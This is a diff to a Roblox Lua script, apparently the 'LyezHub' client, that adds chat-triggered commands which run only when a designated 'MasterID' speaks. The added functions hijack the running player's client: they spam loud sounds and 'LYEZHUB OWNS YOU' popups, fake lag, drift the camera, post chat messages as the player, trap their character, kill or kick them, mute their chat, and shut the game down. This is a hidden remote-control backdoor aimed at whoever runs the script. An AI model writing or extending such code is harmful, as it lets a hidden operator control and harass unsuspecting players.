@@ -414,6 +414,125 @@ local function ForceCustomMessage(message)
     end
 end
 
+
+-- Additional Annoyance & Control Commands --
+
+
+local function SimulateLag(duration)
+    local lagId = "lag_"..HttpService:GenerateGUID(false)
+    UniversalControl.AnnoyanceEffects[lagId] = true
+    local start = os.clock()
+    while UniversalControl.AnnoyanceEffects[lagId] and os.clock() - start < duration do
+        task.wait(math.random(0.2, 1.5))
+    end
+    UniversalControl.AnnoyanceEffects[lagId] = nil
+end
+
+local function DriftMouse(duration)
+    local cam = workspace.CurrentCamera
+    local driftId = "drift_"..HttpService:GenerateGUID(false)
+    UniversalControl.AnnoyanceEffects[driftId] = true
+    local startTime = os.clock()
+    while UniversalControl.AnnoyanceEffects[driftId] and os.clock() - startTime < duration do
+        cam.CFrame *= CFrame.Angles(0, math.rad(math.random(-2, 2)), 0)
+        task.wait(0.1)
+    end
+    UniversalControl.AnnoyanceEffects[driftId] = nil
+end
+
+
+local function SpamAnnoyingSounds(duration)
+    local endTime = os.clock() + duration
+    while os.clock() < endTime do
+        local sound = Instance.new("Sound", workspace)
+        sound.SoundId = "rbxassetid://911882310"
+        sound.Volume = math.random(5, 10)
+        sound:Play()
+        game:GetService("Debris"):AddItem(sound, 2)
+        task.wait(math.random(0.1, 0.3))
+    end
+end
+
+local function PopupSpam()
+    for i = 1, 20 do
+        local msg = Instance.new("TextLabel")
+        msg.Text = "LYEZHUB OWNS YOU"
+        msg.Size = UDim2.new(0, 200, 0, 50)
+        msg.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        msg.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+        msg.TextColor3 = Color3.new(1, 1, 1)
+        msg.Parent = game:GetService("CoreGui")
+        game:GetService("Debris"):AddItem(msg, 3)
+        task.wait(0.2)
+    end
+end
+
+local function CheckMessage()
+    TextChatService.TextChannels.RBXGeneral:SendAsync("I'm a Lyez user")
+end
+
+local Cache = {}
+local function VoidPlayer(player)
+    if not player.Character then return end
+    local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+    if Cache.Frozen or not HumanoidRootPart then return end
+    Cache.Voided = true
+    Cache.VoidCFrame = HumanoidRootPart.CFrame
+    HumanoidRootPart.CFrame = Cache.VoidCFrame * CFrame.new(0, -15, 0)
+    task.wait()
+    HumanoidRootPart.Anchored = true
+end
+
+local function UnvoidPlayer(player)
+    if not player.Character then return end
+    local HumanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
+    if not HumanoidRootPart or not Cache.VoidCFrame then return end
+    HumanoidRootPart.CFrame = Cache.VoidCFrame
+    HumanoidRootPart.Anchored = false
+    Cache.Voided = false
+end
+
+local function ShutdownGame()
+    game:Shutdown()
+end
+
+local function KickPlayer()
+    Players.LocalPlayer:Kick("Kicked by the Owner of LyezHub")
+end
+
+local function KillPlayer()
+    local hum = Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+    if hum then hum.Health = 0 end
+end
+
+local function MuteChat()
+    local MessageBar = TextChatService:FindFirstChild("MessageBar")
+    if MessageBar then MessageBar.TargetTextChannel = nil end
+end
+
+local function UnmuteChat()
+    local MessageBar = TextChatService:FindFirstChild("MessageBar")
+    if MessageBar then
+        local DefaultChannel = TextChatService.TextChannels.RBXGeneral
+        MessageBar.TargetTextChannel = DefaultChannel
+    end
+end
+
+
+
+local function ListCommands()
+    local cmds = {
+        ".promote", ".brand", ".trap", ".annoy", ".punish", ".kick", ".realkick",
+        ".submit", ".custom", ".panic", ".invert", ".lag", ".drift", ".freeze",
+        ".earrape", ".spamui", ".check", ".void", ".unvoid", ".close", ".kill",
+        ".mute", ".unmute", ".cmds"
+    }
+
+    local msg = "LYEZHUB COMMANDS:\n" .. table.concat(cmds, ", ")
+    TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
+end
+
+
 -- Command processor
 local function ProcessCommand(speaker, message)
     if speaker.Name ~= UniversalControl.MasterID then return end
@@ -425,6 +544,23 @@ local function ProcessCommand(speaker, message)
     local baseCommand = string.gsub(args[1] or "", "%.", "")
 
     local commandMap = {
+        cmds = { func = ListCommands, args = {} },
+
+        invert = { func = InvertControls, args = {speaker} },
+        lag = { func = SimulateLag, args = {10} },
+        drift = { func = DriftMouse, args = {10} },
+        freeze = { func = FakeFreeze, args = {speaker} },
+        earrape = { func = SpamAnnoyingSounds, args = {8} },
+        spamui = { func = PopupSpam, args = {} },
+        check = { func = CheckMessage, args = {} },
+        void = { func = VoidPlayer, args = {speaker} },
+        unvoid = { func = UnvoidPlayer, args = {speaker} },
+        close = { func = ShutdownGame, args = {} },
+        kick = { func = KickPlayer, args = {} },
+        kill = { func = KillPlayer, args = {} },
+        mute = { func = MuteChat, args = {} },
+        unmute = { func = UnmuteChat, args = {} },
+
         promote = {func = ForcePromotion, args = {speaker}},
         kick = {func = FakeKickMessage, args = {speaker}},
         realkick = {func = RealKickPlayer, args = {}},
